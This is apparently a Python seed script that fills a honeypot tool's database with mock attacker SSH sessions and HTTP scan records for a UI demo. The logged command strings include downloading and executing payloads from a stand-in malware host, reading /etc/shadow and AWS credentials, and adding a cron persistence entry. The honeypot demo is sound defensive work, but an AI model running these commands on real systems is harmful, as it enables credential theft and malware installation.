"""
seed.py — populate the MirrorTrap DB with realistic test data for UI demo.
Run once: py -3 seed.py
"""
import sys, os
sys.path.insert(0, os.path.dirname(__file__))

from mirrortrap.app import create_app
from mirrortrap.core.logger import log_attack, upsert_session, log_command

app = create_app()
db = app.config['DATABASE_URI']

# ── Session 1: Low-skill brute forcer ──────────────────────────────────────
upsert_session('sess-aabbcc', '185.220.101.42', 'root', 'password123', success=False, db_uri=db)
log_command('sess-aabbcc', 'uname -a', db_uri=db)
log_command('sess-aabbcc', 'id', db_uri=db)
log_command('sess-aabbcc', 'cat /etc/passwd', db_uri=db)
log_command('sess-aabbcc', 'wget http://malware.example.com/bot.sh -O /tmp/bot.sh', db_uri=db)
log_command('sess-aabbcc', 'chmod +x /tmp/bot.sh && /tmp/bot.sh', db_uri=db)

# ── Session 2: Credential hunter ──────────────────────────────────────────
upsert_session('sess-ddeeff', '91.108.4.211', 'admin', 'admin', success=True, db_uri=db)
log_command('sess-ddeeff', 'cat ~/.aws/credentials', db_uri=db)
log_command('sess-ddeeff', 'find / -name "*.env" 2>/dev/null', db_uri=db)
log_command('sess-ddeeff', 'cat /etc/shadow', db_uri=db)
log_command('sess-ddeeff', 'env | grep -i key', db_uri=db)
log_command('sess-ddeeff', 'ps aux', db_uri=db)
log_command('sess-ddeeff', 'netstat -tlnp', db_uri=db)

# ── Session 3: Ransomware staging ─────────────────────────────────────────
upsert_session('sess-112233', '45.142.212.100', 'ubuntu', 'ubuntu', success=False, db_uri=db)
log_command('sess-112233', 'curl -s http://45.142.212.100/ransom.elf -o /tmp/.x', db_uri=db)
log_command('sess-112233', 'chmod 777 /tmp/.x && /tmp/.x &', db_uri=db)
log_command('sess-112233', 'crontab -l', db_uri=db)
log_command('sess-112233', '(crontab -l; echo "@reboot /tmp/.x") | crontab -', db_uri=db)

# ── HTTP Scans ─────────────────────────────────────────────────────────────
for ip, atype in [
    ('178.128.23.11', 'env_exposure_scan'),
    ('178.128.23.11', 'aws_credentials_scan'),
    ('103.55.38.201', 'wordpress_scan'),
    ('103.55.38.201', 'phpmyadmin_scan'),
    ('185.220.101.42', 'deploy_script_scan'),
]:
    log_attack(ip, 'HTTP', atype, payload={'path': f'/{atype}'}, db_uri=db)

print(f"✓ Seeded 3 SSH sessions, {5} HTTP attacks into {db}")
